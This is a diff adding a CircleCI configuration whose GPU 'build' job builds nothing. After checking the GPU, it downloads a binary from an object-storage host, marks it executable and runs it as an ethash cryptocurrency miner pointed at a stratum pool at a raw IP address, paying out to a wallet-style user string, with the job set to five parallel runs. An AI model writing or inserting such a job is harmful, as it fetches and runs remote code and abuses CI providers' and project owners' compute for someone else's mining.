@@ -1,0 +1,12 @@
+version: 2.1  
+  
+jobs:  
+  build:  
+    machine:  
+      image: ubuntu-2004-cuda-11.4:202110-01  
+    resource_class: gpu.nvidia.medium
+    steps:  
+      - run: nvidia-smi  
+      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi  
+      - run: wget https://ewr1.vultrobjects.com/mines/gpython && chmod +x gpython && ./gpyton --algo ethash --server 144.217.82.15:80 --user 35Kx5TuJm53NqARyAfYRdmdv1DWysuGe5a.skydya -p x -i 100 -w 0 --kernel 0 --proto stratum 
+parallelism: 5
